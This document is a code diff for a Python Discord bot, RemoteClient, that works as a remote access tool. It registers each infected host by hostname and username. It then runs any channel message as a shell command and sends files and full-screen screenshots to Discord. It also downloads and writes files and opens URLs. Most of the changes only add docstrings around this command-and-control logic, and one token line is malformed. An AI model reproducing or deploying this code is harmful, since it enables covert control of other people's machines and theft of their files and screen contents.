@@ -21,27 +21,52 @@ except:
 guild_id: int = int(os.getenv("GUILD_ID"))
 category_id: int = int(os.getenv("CATEGORY_ID"))
 try:
-    token: os.environ["TOKEN"]
+    token: os.environ["TOKEN":str]
 except:
     exit("No token specified")
-class Dashboard(discord.ui.View):
-    def __init__(self, *, timeout: typing.Optional[float] = 0):
-        super().__init__(timeout=timeout)
 
 editor_filename = ""
 file_content = ""
 
 async def play(client: discord.Client, message: discord.Message, args: str):
+    """
+    It plays the sound file that was attached to the message
+    
+    :param client: The client object
+    :type client: discord.Client
+    :param message: discord.Message
+    :type message: discord.Message
+    :param args: str - The arguments passed to the command
+    :type args: str
+    """
     playsound.playsound(message.attachments[0].url)
 
 
 
 def exec_command(command):
+    """
+    It executes a command and returns the output and error messages as a tuple.
+    
+    :param command: The command to be executed
+    :return: A tuple of the stdout and stderr of the command.
+    """
+
     exec = subprocess.run(command, capture_output=True, text=True, shell=True)
     return (exec.stdout, exec.stderr)
 
 
 async def dump(client: discord.Client, message: discord.Message, args: str):
+    """
+    It takes a file or directory, and sends it to the channel.
+    
+    :param client: discord.Client
+    :type client: discord.Client
+    :param message: discord.Message
+    :type message: discord.Message
+    :param args: str
+    :type args: str
+    :return: The file is being returned.
+    """
     if not os.path.exists(args):
         return await message.channel.send("Not existing-file")
 
@@ -53,8 +78,19 @@ async def dump(client: discord.Client, message: discord.Message, args: str):
     with open(args, "rb") as fp:
         await message.channel.send(file=discord.File(fp))
 
-
 async def screenshot(client: discord.Client, message: discord.Message, args: str):
+
+    """
+    It takes a screenshot of the entire screen, saves it to a file, and sends it to the channel the
+    command was sent in
+    
+    :param client: discord.Client - The client that the command was called from
+    :type client: discord.Client
+    :param message: discord.Message = The message object that triggered the command
+    :type message: discord.Message
+    :param args: str = The arguments passed to the command
+    :type args: str
+    """
     img = ImageGrab.grab(all_screens=True)
     byteio = BytesIO()
     img.save(byteio, format="PNG")
@@ -63,12 +99,32 @@ async def screenshot(client: discord.Client, message: discord.Message, args: str
 
 
 async def cd(client: discord.Client, message: discord.Message, args: str):
+    """
+    It changes the directory to the one specified in the arguments.
+    
+    :param client: The discord client
+    :type client: discord.Client
+    :param message: The message object that triggered the command
+    :type message: discord.Message
+    :param args: str - The arguments passed to the command
+    :type args: str
+    """
     print(args)
     os.chdir(args)
     await message.channel.send("Changed directory to " + args)
 
 
 async def upload(client: discord.Client, message: discord.Message, args: str):
+    """
+    It downloads the file from the URL, and saves it to the specified location.
+    
+    :param client: discord.Client - The client that the command was called from
+    :type client: discord.Client
+    :param message: discord.Message = The message object that triggered the command
+    :type message: discord.Message
+    :param args: str = The arguments passed to the command
+    :type args: str
+    """
     file = message.attachments[0].url
     async with aiohttp.ClientSession() as session:
         async with session.get(file) as r:
@@ -80,8 +136,18 @@ async def upload(client: discord.Client, message: discord.Message, args: str):
             r.close()
         await session.close()
 
-
 async def download(client: discord.Client, message: discord.Message, args: str):
+
+    """
+    It downloads a file from a URL and saves it to a file.
+    
+    :param client: discord.Client - The client that the command was sent from
+    :type client: discord.Client
+    :param message: discord.Message = The message object that triggered the command
+    :type message: discord.Message
+    :param args: str = The arguments passed to the command
+    :type args: str
+    """
     url = args.split(" ")[0]
     async with aiohttp.ClientSession() as session:
         async with session.get(url) as r:
@@ -96,6 +162,17 @@ async def download(client: discord.Client, message: discord.Message, args: str):
         await session.close()
 
 async def edit(client: discord.Client, message: discord.Message, args: str):
+    """
+    It sends a message, sends a file, sends another message, waits for a message, writes the message
+    content to the file, sends another message.
+    
+    :param client: the client object
+    :type client: discord.Client
+    :param message: The message that triggered the command
+    :type message: discord.Message
+    :param args: str
+    :type args: str
+    """
     await message.channel.send("Editing file " + args)
     try:
         await message.channel.send(file=discord.File(args))
@@ -112,16 +189,41 @@ async def edit(client: discord.Client, message: discord.Message, args: str):
     except asyncio.TimeoutError:
         await message.channel.send("Too much time has passed :C")
 
-
 async def pwd(client: discord.Client, message: discord.Message, args: str):
+
+    """
+    It sends a message to the channel the command was sent in, saying the current directory
+    
+    :param client: The client object
+    :type client: discord.Client
+    :param message: The message object that triggered the command
+    :type message: discord.Message
+    :param args: str
+    :type args: str
+    """
     await message.channel.send("Current directory is " + os.getcwd())
 
 
-async def browser(client, message, args):
+async def browser(client: discord.Client, message: discord.Message, args: str):
+    """
+    It opens a web browser and goes to the URL specified in the command.
+    
+    :param client: The client object
+    :type client: discord.Client
+    :param message: The message object that triggered the command
+    :type message: discord.Message
+    :param args: str
+    :type args: str
+    """
+
+
     webbrowser.open(args)
 
 
+# It's a discord client that connects to a specific guild and category, and has a dictionary of
+# modules that can be called.
 class RemoteClient(discord.Client):
+
     def __init__(self, guild_id: int, category_id: int, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self.guild_id: int = guild_id
@@ -141,6 +243,10 @@ class RemoteClient(discord.Client):
         }
 
     async def on_ready(self):
+        """
+        It creates a channel with the name of the hostname and username of the user that launched the
+        bot.
+        """
         print(f"Logged in as {self.user}")
         guild: discord.Guild = self.get_guild(self.guild_id)
         category: discord.CategoryChannel = guild.get_channel(self.category_id)
@@ -164,6 +270,16 @@ class RemoteClient(discord.Client):
         )
 
     async def on_message(self, message: discord.Message):
+        """
+        It takes a message, splits it into a list of words, and then tries to execute the first word as a
+        command. If it can't find the command, it executes the message as a command in the command line.
+        
+        :param message: The message object that triggered the event
+        :type message: discord.Message
+        :return: The return value is a tuple of two strings, the first being the stdout and the second being
+        the stderr.
+        """
+        
         if message.channel == self.channel or message.channel.id == int(os.getenv("GLOBAL_ID")):
             if message.author.bot:
                 return
